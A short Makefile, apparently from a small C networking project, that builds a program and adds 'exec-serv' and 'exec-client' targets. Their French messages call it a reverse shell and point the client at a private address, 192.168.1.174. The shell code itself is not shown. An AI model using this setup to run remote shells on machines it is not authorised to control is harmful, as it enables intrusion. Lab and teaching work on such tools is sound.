OS := $(shell uname -s)

CC = gcc
CFLAGS = -Wall -Wextra -I./src
LDFLAGS =
SRC = src/main.c
OBJ = main.o
BIN = myProgram

ifeq ($(findstring MINGW_NT, $(OS)),MINGW_NT)
    LDFLAGS += -lws2_32
endif

all: $(BIN)

$(BIN): $(OBJ)
	$(CC) $(CFLAGS) -o $(BIN) $(OBJ) $(LDFLAGS)

main.o: $(SRC)
	$(CC) $(CFLAGS) -c $(SRC) -o $(OBJ)

clean:
	rm -f $(OBJ) $(BIN)

exec-serv: all
	@echo "=== Lancement du serveur (reverse shell) ==="
	./$(BIN) -s

exec-client: all
	@echo "=== Lancement du client (reverse shell) ==="
	./$(BIN) -c 192.168.1.174
